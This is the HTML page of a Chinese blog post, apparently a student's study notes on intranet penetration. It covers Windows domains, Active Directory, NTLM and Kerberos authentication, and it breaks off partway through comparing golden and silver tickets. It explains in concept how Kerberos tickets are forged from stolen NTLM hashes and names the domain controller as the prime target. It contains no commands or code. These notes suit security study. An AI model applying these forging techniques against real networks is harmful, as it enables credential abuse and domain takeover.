<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="baidu-site-verification" content="093lY4ziMu" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="description" content="blog-wxx">
    <meta name="keyword"  content="wxx">
    <link rel="shortcut icon" href="/img/ironman-draw.png">
    <!-- Place this tag in your head or just before your close body tag. -->
    <script async defer src="https://buttons.github.io/buttons.js"></script>
    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
    <title>
        
          内网学习 - wxx&#39;s_Blog
        
    </title>

    <link rel="canonical" href="https://github.com/wxx0105/wxx0105.github.io/2022/03/05/内网学习/">

    <!-- Bootstrap Core CSS -->
    
<link rel="stylesheet" href="/css/bootstrap.min.css">


    <!-- Custom CSS --> 
    
        
<link rel="stylesheet" href="/css/dusign-dark.css">

        
<link rel="stylesheet" href="/css/dusign-common-dark.css">

        
<link rel="stylesheet" href="/css/font-awesome.css">

        
<link rel="stylesheet" href="/css/toc.css">

    
    
    <!-- Pygments Highlight CSS -->
    
<link rel="stylesheet" href="/css/highlight.css">


    
<link rel="stylesheet" href="/css/widget.css">


    
<link rel="stylesheet" href="/css/rocket.css">


    
<link rel="stylesheet" href="/css/signature.css">


    
<link rel="stylesheet" href="/css/fonts.googleapis.css">


    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">

    <!-- photography -->
    
<link rel="stylesheet" href="/css/photography.css">


    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<!-- hack iOS CSS :active style -->
<body ontouchstart="">

    <!-- background effects start -->
    
    <!-- background effects end -->

	<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->
<style type="text/css">
    header.intro-header{
        
            
                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.5)), url('../../../../img/wallhaven-6ogjgl.png')
                /*post*/
            
        
    }
    
</style>

<header class="intro-header" >
    <!-- Signature -->
    <div id="signature">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                
                    <div class="post-heading">
                        <div class="tags">
                            
                              <a class="tag" href="/tags/#内网" title="内网">内网</a>
                            
                        </div>
                        <h1>内网学习</h1>
                        <h2 class="subheading"></h2>
                        <span class="meta">
                            Posted by wx_x on
                            2022-03-05
                        </span>

                        
                            <div class="blank_box"></div>
                            <span class="meta">
                                Words <span class="post-count">12.2k</span> and
                                Reading Time <span class="post-count">47</span> Minutes
                            </span>
                            <div class="blank_box"></div>
                            <!-- 不蒜子统计 start -->
                            <span class="meta">
                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
                            </span>
                            <!-- 不蒜子统计 end -->
                        

                    </div>
                

                </div>
            </div>
        </div>      
    </div>

    
    <div class="waveWrapper">
        <div class="wave wave_before" style="background-image: url('/img/wave-dark.png')"></div>
        <div class="wave wave_after" style="background-image: url('/img/wave-dark.png')"></div>
    </div>
    
</header>

	
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">wxx</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <!-- Known Issue, found by Hux:
            <nav>'s height woule be hold on by its content.
            so, when navbar scale out, the <nav> will cover tags.
            also mask any touch event of tags, unfortunately.
        -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="/">Home</a>
                    </li>

                    

                        
                    

                        
                        <li>
                            <a href="/archive/">Archives</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/about/">About</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/tags/">Tags</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/photography/">Photography</a>
                        </li>
                        
                    
                    
                    
                </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>
<script>
    // Drop Bootstarp low-performance Navbar
    // Use customize navbar with high-quality material design animation
    // in high-perf jank-free CSS3 implementation
    var $body   = document.body;
    var $toggle = document.querySelector('.navbar-toggle');
    var $navbar = document.querySelector('#huxblog_navbar');
    var $collapse = document.querySelector('.navbar-collapse');

    $toggle.addEventListener('click', handleMagic)
    function handleMagic(e){
        if ($navbar.className.indexOf('in') > 0) {
        // CLOSE
            $navbar.className = " ";
            // wait until animation end.
            setTimeout(function(){
                // prevent frequently toggle
                if($navbar.className.indexOf('in') < 0) {
                    $collapse.style.height = "0px"
                }
            },400)
        }else{
        // OPEN
            $collapse.style.height = "auto"
            $navbar.className += " in";
        }
    }
</script>


    <!-- Main Content -->
    <!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Post Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container">

                <h2 id="内网中常见名词解释"><a href="#内网中常见名词解释" class="headerlink" title="内网中常见名词解释"></a>内网中常见名词解释</h2><h3 id="工作组-Work-Group"><a href="#工作组-Work-Group" class="headerlink" title="工作组(Work Group)"></a>工作组(Work Group)</h3><p>最常见最简单最普通的资源管理模式，把电脑按照功能分别列入组中。</p>
<p>所有计算机<strong>平等</strong>，没有上下级管理关系，工作组网络也称之为对等网络</p>
<p><code>因为其缺乏验证连入电脑的身份，所以只适用于中小型计算机网络</code></p>
<p>大型网络需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式，于是域就出现了</p>
<p><a href="https://www.freebuf.com/articles/network/210852.html" target="_blank" rel="noopener">ARP 欺骗</a>、<a href="https://www.freebuf.com/articles/network/272514.html" target="_blank" rel="noopener">DNS 欺骗</a>只在工作组有效</p>
<h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域(Domain)"></a>域(Domain)</h3><p>可理解为工作组的<code>升级版</code>，有诸多规矩来确认入网用户身份，也就是有安全界，域模式下，至少需要一台服务器负责每一台连入网络的电以及用户的验证工作，该服务器称为 <code>域控制器</code></p>
<h3 id="域控制器（Domain-Controller：DC）"><a href="#域控制器（Domain-Controller：DC）" class="headerlink" title="域控制器（Domain Controller：DC）"></a>域控制器（Domain Controller：DC）</h3><p>域控制器中包含了由这个域的账户，密码，属于这个域的计算机等信息构成的数据库，类似密码本。</p>
<p>工作：当电脑连入网络的时候，域控制器首先需要鉴别这台电脑是否属于这个域的，用户所使用的登录账号，密码是否正确；当以上条件有一样不满足的，DC拒绝该电脑接入网络，起到保护网络资源的作用</p>
<p>意义：正是因为DC可以验证身份，因此是我们渗透测试的首要目标，拿下DC，这个域唾手可得</p>
<p>而想要实现域环境，就必须要计算机中安装<code>活动目录</code>，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员<code>服务器</code>、<code>客户机</code>、<code>独立服务器</code>。</p>
<h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>在域中建立的域，称为外层域的子域</p>
<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>由多个域组成，域间共享同一表级结构和配置，形成一个连续的名字空间。</p>
<p>树中的域通过信任关系连接起来，活动目录（AD：用于存储信息）包含一个或多个域树。域树中，域层次越深级别越低：“.” ，代表一个层次，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">child.mc.com（2层次）</span><br><span class="line">mc.com（1层次）</span><br><span class="line"></span><br><span class="line">mc.com级别高于上</span><br><span class="line">child.mc.com为mc.com的子域</span><br></pre></td></tr></table></figure>
<p>多个域树可以组成一个域林。</p>
<h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>由一个或多个没有形成连续名字空间的域树组成，与域树的区别在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p>
<p>但是，域林中所有的域树仍共享同一个表结构，配置和全局目录。</p>
<p>域林中所有域树通过Kerberos（计算机网络授权协议其 特点是用户只需输入一次身份验证信息就可以凭借此验证获得的票据TGT (ticket-granting ticket) 访问多个服务，即 SSO (Single Sign On)）信任关系建立。</p>
<p>域林的根域是域林中创建的<code>第一个</code>域，域林中所有的域树的根域可以与域林的根域建立可传递的信任关系</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cas.com.cn（林根域）  ，可以创建一个同属于该林的gxu.com.cn</span><br><span class="line">当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</span><br></pre></td></tr></table></figure>
<p>林，是一个或多个共享<code>公共架构</code>和<code>全局编录</code>的<code>域</code>组成，每个域都有单独的安全策略，和与其他域的信任关系;一个单位可以有多个林。**</p>
<p><img src="../../../AppData/Roaming/Typora/typora-user-images/image-20220125205726005.png" alt="image-20220125205726005"></p>
<h3 id="活动目录（Active-Directory）"><a href="#活动目录（Active-Directory）" class="headerlink" title="活动目录（Active Directory）"></a>活动目录（Active Directory）</h3><p>是Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于Windows Server产品中</p>
<p>目录包含了，有关的各种对象，比如：用户，用户组，计算机，域，组织单位（OU）以及安全策略的信息。目录存储在域控（DC）上，比关切可以被网络应用程序或者服务访问</p>
<p><code>活动目录</code>就相当于内网中<code>各种资源</code>的一个目录，通过活动目录用户可以快速<code>定位到这些资源的位置</code>。</p>
<h3 id="DMZ-Demilitarized-zone"><a href="#DMZ-Demilitarized-zone" class="headerlink" title="DMZ(Demilitarized zone)"></a>DMZ(Demilitarized zone)</h3><p>隔离区；非军事化区。</p>
<p>作用：为了解决安装防火墙后，外网的访问用户不能访问内网中资源，设立的一个非安全系统与安全系统之间的缓冲区。</p>
<p>不同于内网，也不是外网，在DMZ区常防止一些不含机密信息的公用服务器：web server，E-mail server，FTP服务器等。这样来自外网的访问者只能对于DMZ区域的资源进行访问，访问不到内网的机密信息，即使DMZ区域被破坏，内网不受影响。</p>
<h3 id="域内的各种权限"><a href="#域内的各种权限" class="headerlink" title="域内的各种权限"></a>域内的各种权限</h3><h4 id="组"><a href="#组" class="headerlink" title="组"></a>组</h4><p>什么是组？      组内包含很多用户，当管理员想要分配某个用户权限时，只需要将用户加入到对应的权限的组里皆可，很高的管理效率；常见的组有：域与本地组，全局组，通用组</p>
<h5 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成员范围：所有的域</span><br><span class="line">适用范围：自己所在的域</span><br></pre></td></tr></table></figure>
<h5 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成员范围：自己所在的域</span><br><span class="line">适用范围：所有的域</span><br></pre></td></tr></table></figure>
<h5 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成员范围：所有的域；</span><br><span class="line">使用范围：所有的域</span><br></pre></td></tr></table></figure>
<h4 id="A-G-DL-P-策略"><a href="#A-G-DL-P-策略" class="headerlink" title="A-G-DL-P 策略"></a><strong>A-G-DL-P 策略</strong></h4><p>A-G-DL-P 策略是将<code>用户账号</code>添加到<code>全局组</code>中，将<code>全局组</code>添加到<code>域本地组</code>中，然后为域本地组分配资源权限。</p>
<ul>
<li>A 表示用户账号</li>
<li>G 表示全局组</li>
<li>U 表示通用组</li>
<li>DL 表示域本地组</li>
<li>P 表示资源权限</li>
</ul>
<p><strong>参考：<a href="https://www.freebuf.com/articles/network/283763.html" target="_blank" rel="noopener">内网渗透测试：内网环境与活动目录基础概念 - FreeBuf 网络安全行业门户</a></strong></p>
<p><strong>参考：TeamsSix（微信公众号）</strong></p>
<hr>
<h2 id="windows安全认证机制"><a href="#windows安全认证机制" class="headerlink" title="windows安全认证机制"></a>windows安全认证机制</h2><p>域渗透最基础</p>
<h3 id="验证是什么？"><a href="#验证是什么？" class="headerlink" title="验证是什么？"></a>验证是什么？</h3><p><code>认证是决定某人或某事是否确实是它声称的样子</code></p>
<h3 id="NTLM验证"><a href="#NTLM验证" class="headerlink" title="NTLM验证"></a>NTLM验证</h3><p>NTLM认证是什么？</p>
<p>NTLM验证时 NT LAN Manger的缩写，NTLM是基于 挑战/应答的身份验证协议，是Windows NT 早期版本中的标准安全协议。</p>
<h4 id="本地验证"><a href="#本地验证" class="headerlink" title="本地验证"></a>本地验证</h4><p>用户密码存储在SAM文件中，可以当作其为密码数据库，所有的操作均在本地进行，NTLM验证机制将用户输入的密码转换为NTLM Hash，然后与SAM文件中的NTLM Hash进行比较。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在本地登陆的情况下，操作系统会使用用户输入的密码作为凭据去与系统中的密码进行校验，如果成功的话表明验证通过。操作系统的密码存储在C盘的目录下：%SystemRoot%\system32\config\sam</span><br></pre></td></tr></table></figure>
<p><strong>补充：NTLM Hash：</strong></p>
<p>为了解决 LM Hash 的安全问题，微软于 1993 年在 Windows NT 3.1 中引入了 NTLM 协议。Windows 2000 / XP / 2003 在密码超过 14 位前使用 LM Hash，在密码超过 14 位后使用 NTLM Hash。而之后从 Vista 开始的版本都使用 NTLM Hash。</p>
<p>NTLM Hash 的计算方法为：</p>
<ul>
<li>将密码转换为 16 进制，进行 Unicode 编码</li>
<li>基于 MD4 计算哈希值</li>
</ul>
<p>本地验证的一些知识</p>
<ul>
<li><p>SAM用于存储本地所有用户的凭证信息，但是我们用户不可所以查看系统密码，登陆时系统会自己带着你输入后的并且hash加密过的密码去与SAM中的比较，SAM不存储明文，存的是Hash</p>
</li>
<li><p>认证过程：当用户注销，或者重启，锁屏后，OS会让winlogon显示登录界面，当winlogon.exe收到密码输入后（账号默认上次登录账户），将密码交给lsass进程，该进程会将明文密码Hash加密后对SAM数据库进入比较</p>
<p>补充</p>
<p>winlogon.exe即Windows Logon Process，是Windows NT用户登陆程序，用于管理用户登录和退出。</p>
<p>LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</p>
<p><img src="https://s2.loli.net/2022/02/06/ArzkoCaButc25R9.png" alt="image-20220206115953128"></p>
</li>
</ul>
<h4 id="网络验证"><a href="#网络验证" class="headerlink" title="网络验证"></a>网络验证</h4><p>先了解：SMB协议：Server Message Block</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SMB（ServerMessage Block）通信协议是微软（Microsoft）和英特尔(Intel)在<span class="number">1987</span>年制定的协议，主要是作为Microsoft网络的通讯协议。</span><br><span class="line">SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。</span><br><span class="line">SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API），一般端口使用为<span class="number">139</span>，<span class="number">445</span>。smb喷射</span><br><span class="line">另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有<span class="number">65</span>个最上层的作业，而每个作业都超过<span class="number">120</span>个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（CommonInternet File System），并且加入了许多新的特色。</span><br><span class="line"></span><br><span class="line">早期SMB协议在网络上传输的是明文口令。后来出现LAN Manager ChallengeResponse 验证机制，简称LM： NTLM</span><br><span class="line"></span><br><span class="line">微软提出了windowsNT 挑战/响应 验证机制，简称MTLM。现在已经更新到了V2版本以及加入了Kerberos验证体系(最新)</span><br></pre></td></tr></table></figure>
<p>NTLM协议的认证共需要三个消息完成：协商 —&gt; 挑战 —&gt; 认证</p>
<ul>
<li>协商：用于确认双方协议版本，加密等级等</li>
<li>挑战：服务器收到客户端的协商消息之后，读取其中内容，选择自己支持的服务内容，加密等级，安全服务等，生成一个随机数challenge，生成其消息返回给客户端，此消息就是 challeng/response的体现</li>
<li>认证：挑战完成后，对结果的验证</li>
</ul>
<p>基于challange/response机制：一般流程</p>
<ol>
<li>server接收到client发送的用户名后，判断本地账户列表是否存在该用户：否，则返回认证失败；是，则生成challenge，并且在server本地查找该用户对应的<code>NTLM Hash</code>加密算法，并使用该加密算法加密challenge生成一个<code>Net-NTLM Hash（用于验证）</code>到内存中，发送challenge至client</li>
<li>client接受到challenge后，client将用户输入的密码进行转换，转换为<code>NTLM Hash</code>后，使用该<code>NTLM Hash</code>加密challenge，加密后的结果为response（表现形式：Net-NTLM Hash），最后发送给server</li>
<li>server接收response后，将response与内存中的经过加密后的challenge比较，一致则认证成功，不一致，则认证失败。</li>
<li>最后server记录至登录日志</li>
</ol>
<p><img src="https://s2.loli.net/2022/02/08/aHowC5b8SqnVUeM.png" alt="image-20220208133105850"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</span><br><span class="line">Challage:NTLM v1的Challenge有<span class="number">8</span>位，NTLM v2的Challenge为<span class="number">16</span>位。</span><br><span class="line">Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</span><br></pre></td></tr></table></figure>
<p>一些常用端口：（我的blog也有些许记录，但是还是不如下面的 总结实在）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">53</span><br><span class="line">DNS服务，在使用中需要用到TCP&#x2F;UDP 53端口，AD域的核心就是DNS服务器，AD通过DNS服务器定位资源</span><br><span class="line">88</span><br><span class="line">Kerberos服务，在使用中需要用到TCP&#x2F;UDP 88端口，Kerberos密钥分发中心(KDC) 在该端口上侦听Ticket请求</span><br><span class="line">135</span><br><span class="line">135端口主要用于使用RPC协议并提供DCOM服务。</span><br><span class="line">137</span><br><span class="line">NetBIOS-NS(名称服务)，在使用中需要用到TCP&#x2F;UDP 137端口</span><br><span class="line">139</span><br><span class="line">Session Server(会话服务),在使用中需要用到TCP&#x2F;UDP 139端口，允许两台计算机建立连接</span><br><span class="line">389</span><br><span class="line">LDAP服务(轻量级目录访问协议)，在使用中需要用到TCP&#x2F;UDP 389端口，如果需要使用SSL，需要使用636端口，</span><br><span class="line">445</span><br><span class="line">主要用于共享文件夹或共享打印，存在较多漏洞，如MS08-067、MS17-010</span><br><span class="line">3268 Global Catalog(全局编录服务器)，如果需要使用SSL，需要用到3269端口，主要用于用户登录时，负责验证用户身份的域控制器需要通过防火</span><br><span class="line">墙，来向“全局编录”查询用户所隶属的通用组</span><br></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>安全性较差，只需获得一个系统管理员的hash就可以直接拿个DC进行验证授权，账户名，用户名均已知</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><p><a href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html" target="_blank" rel="noopener">9.7. NTLM 身份验证 — Web 安全学习笔记 1.0 文档 (websec.readthedocs.io)</a></p>
</li>
<li><p>微信：黑白天安全：（windows之NTLM验证）{<a href="https://cloud.tencent.com/developer/article/1681373Kerberos}认证{" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1681373Kerberos}认证{</a><br><a href="https://blog.csdn.net/irony0egoist/article/details/109493103}域前置{" target="_blank" rel="noopener">https://blog.csdn.net/irony0egoist/article/details/109493103}域前置{</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/107742843" target="_blank" rel="noopener">https://blog.csdn.net/qq_41874930/article/details/107742843</a><br><a href="https://cloud.tencent.com/developer/article/1785562?ivk_sa=1024320u" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1785562?ivk_sa=1024320u</a><br><a href="https://www.anquanke.com/post/id/243146}，非常牛逼的平台，非常牛的河池学院！" target="_blank" rel="noopener">https://www.anquanke.com/post/id/243146}，非常牛逼的平台，非常牛的河池学院！</a></p>
</li>
<li><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4" target="_blank" rel="noopener">NTLM 基础 介绍 - windows protocol (gitbook.io)</a></li>
</ul>
<h3 id="KERBEROS验证"><a href="#KERBEROS验证" class="headerlink" title="KERBEROS验证"></a>KERBEROS验证</h3><p>kerberos看了好多次都没仔细了解过，是我对于学习还不是很深究学习，此乃大忌！</p>
<h4 id="Kerberos是什么呢？"><a href="#Kerberos是什么呢？" class="headerlink" title="Kerberos是什么呢？"></a>Kerberos是什么呢？</h4><p>是冥界守护神兽！</p>
<p>Kerberos是一种网络认证协议，一种独立于主机操作系统的认证方式（独立=不依赖），无需基于主机地址的不信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意读取，篡改数据，换句话说，完全Kerberos认证完全是从一个不安全的网络出发进行安全认证的，拥有第三方信托机构，组成信任体系<code>client</code>、<code>server</code>、<code>KDC(Key Distribution Center：密钥分发中心)</code></p>
<p>KDC：物理结构看，KDC包含AS和TGS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DC&#x3D;AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</span><br><span class="line"></span><br><span class="line">AD，全称叫 Account Database，被称作活动目录数据库，存放在域控 NTDS.DIT 文件中，存储域中所有用户的用户名和对应的 NTLM Hash（对应加密方式，具有独特性），KDC 可以从 AD 中提取域中所有用户的 NTLM Hash，这是 Kerberos 协议能够成功实现的基础。</span><br><span class="line"></span><br><span class="line">TGS，全称叫 Ticket Granting Service：票据授予服务，也是 KDC 的组件之一，从 AS 那里拿到 TGT 之后，TGS 再发出对某个特定服务或服务器访问的 Ticket，这个 Ticket 允许client对某个服务访问。</span><br><span class="line"></span><br><span class="line">AS，全称叫 Authenication Service：身份验证服务，是 KDC 的组件之一，处理初始请求并负责发出 TGT 给 Client，用来完成对 Client 的身份验证。</span><br><span class="line"></span><br><span class="line">TGT (Ticket Granting Ticket)：用来获取 Ticket 的临时凭证：黄金票据（AS 身份认证服务提供的票据，称为黄金票据）也就是TGT：该Ticket 是用来访问某种服务所必须使用的票据（下图的第2步骤返回的票据，用于申请TGS授权），存储在内存，默认有效期为 10 小时。</span><br><span class="line"></span><br><span class="line">Client 密钥 TGS 密钥 和 Service 密钥 均为对应用户的 NTLM Hash</span><br></pre></td></tr></table></figure>
<h4 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h4><p>在 <a href="https://baike.baidu.com/item/Kerberos认证/9309861" target="_blank" rel="noopener">Kerberos 认证</a>系统中，用户首先向<a href="https://baike.baidu.com/item/认证服务器/17610765" target="_blank" rel="noopener">认证服务器</a>申请初始票据，然后票据授权服务器 (TGS) 获得会话密码。（熟悉的第三方）<img src="https://s2.loli.net/2022/02/09/xFscjDaQHquE7tN.png" alt=""></p>
<p><code>Client 密钥 TGS 密钥 和 Service 密钥 均为对应用户的 NTLM Hash，这三个 NTLM Hash 的唯一作用是确1保会话密钥 Sessionkey 的安全传输</code></p>
<p>了解了Kerberos的基本结构，现在看看上图，就是最概括的认证结构图，但是其中细节值得我深究一下，其详细：</p>
<ul>
<li><p>用户登录：client<img src="https://s2.loli.net/2022/02/09/C6sUuVwtEoS57MO.png" alt="image-20220209122720143"></p>
</li>
<li><p>请求身份验证：AS认证服务器<img src="https://s2.loli.net/2022/02/09/7C8NMj5L4eTgPsB.png" alt="image-20220209123413670"><img src="https://s2.loli.net/2022/02/09/Id5hRtYDAHvUwuS.png" alt=""></p>
<p>AS收到用户任认证请求后，根据其中明文用户名信息在库中查询其是否存在</p>
<p>若用户名存在，根据用户名提取其对应的NTLM Hash作为AS生成client密钥，若clent的密码信息正确，则这个由AS生成的密钥与client生成的密钥是一样的</p>
<p>AS响应以下消息：<br>-Msg A：使用KDC生成的Client密钥去加密的CLIENT/TGS SESSIONKEY<br>-Msg B：使用TGS密钥加密的TGT，client无对应密钥，无法解开，所以这个TGT是去申请TGS授权的；但是可以利用自身的client密钥解开Msg A;</p>
<p>TGT内容包含：</p>
<pre><code>[Client/TGS SessionKey]
Client ID
Ticket 有效时间
CLient 地址
</code></pre><p>总结<br>AS 响应的消息中有一条是属于 Client 的，但另外一条却属于 TGS。<br>Client/TGS SessionKey 出现了两个 Copy，一个给 Client 端，一个给 TGS 端。<br>认证过程中的加密除哈希外均采用的是 对称加密 算法。</p>
</li>
</ul>
<ul>
<li><p>请求授权服务<img src="https://s2.loli.net/2022/02/09/5fnItVWqaAk2NJh.png" alt="image-20220209133555661"><img src="https://s2.loli.net/2022/02/09/r7wS4l95hpZsLbi.png" alt=""><img src="https://s2.loli.net/2022/02/09/ZM5WHLcshqCPavi.png" alt="image-20220209134144383"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>也就是如上图（白底），TGS最后通过AS下发的TGT，来给client授权<br>我有一个疑问，如果密码正确，可以直接在AS上验证，然后AS直接给到TGS直接下发授权凭证呢？<br><code>-我自己的想法┗|｀O′|┛ 嗷~~，欢迎大家批评；我先想到client的等待时间会加长，这个可以设置一个回显就可以搞定，排除这个，我其次考虑是AS服务器运行能力跟不上，但是AS也没干什么啊，只是验证密码hash和下发凭证给client，我觉得也不是这个，再就是如果，client取消申请，那么如果我假想的一体化KDC就会增加等待时间，会不灵活，再就是如果一体化，那么就需要设置机器识别码，那么就可能需要遍历所有的client去寻找这个TGS的授权申请者：一是不灵活，二是增加授权时间以及提高了运行要求；（这也是我学到这里想的，希望可以学到下面自己上来纠正）</code>，其实吧，回过头来看，我的想法有点蠢，因为完全是自己主观去看，其实KErberos验证的真正目的是安全，这样做多一次相互验证，更能保证安全性；（晚点再回过头来看看）</p>
</li>
<li><p>发送服务请求<img src="https://s2.loli.net/2022/02/09/VEuLoealikBnN5H.png" alt=""><img src="https://s2.loli.net/2022/02/09/wcLPRTiogSCrkVD.png" alt="image-20220209141239825"></p>
</li>
</ul>
<h4 id="认证过程中防止伪造"><a href="#认证过程中防止伪造" class="headerlink" title="认证过程中防止伪造"></a>认证过程中防止伪造</h4><p>票据伪造原理，伪造授权原理</p>
<p><strong>2.2</strong>. AS确认client端登录者用户身份伪造原理</p>
<ul>
<li>伪造黄金票据：若<code>获得用户密码的NTML Hash</code>，则主动使用该用户的NTML Hash作为TGS去加密TGT，此时，该TGT内容可以是任意服务，从AS返回client；此时伪造的TGT发送给KDC（发送至TGS），当KDC通过解密伪造的TGT，获取[CLIENT/TGS SESSIONKEY]，也可直接解密Authenticator 1，并完成TGT与其的比对，那么就成功拿到TGS返回的授权凭证，去获得服务</li>
</ul>
<p><strong>4.1</strong>. client向SS发送服务请求伪造原理</p>
<ul>
<li>伪造白银票据：若<code>获得服务器（SS）的NTML Hash</code>，则可以伪造ticket，看图就知道，ticket是由SS的密钥加密的，所以其中的任何内容，我们都可以伪造，也可也伪造Authenticator 2，当伪造的两个Msg发送至SS端，SS可以正常解锁，完成伪造</li>
</ul>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>使用票据验证方式，并支持双向验证，安全性比NTML高；在网络中传递消息非明文；它将每个用户要记住的使用整个网络的密码数量减少到一个 Kerberos 密码</p>
<p>黄金票据与白银票据的区别</p>
<ol>
<li><p>访问权限不同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黄金：伪造TGT-获取Kerberos的任何服务（AS认证下发）</span><br><span class="line">白银；伪造TGS-只获取指定服务</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密方式不同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黄金：由Kerberos的Hash加密</span><br><span class="line">白银：由服务账号Hash加密</span><br></pre></td></tr></table></figure>
</li>
<li><p>认证流程不同</p>
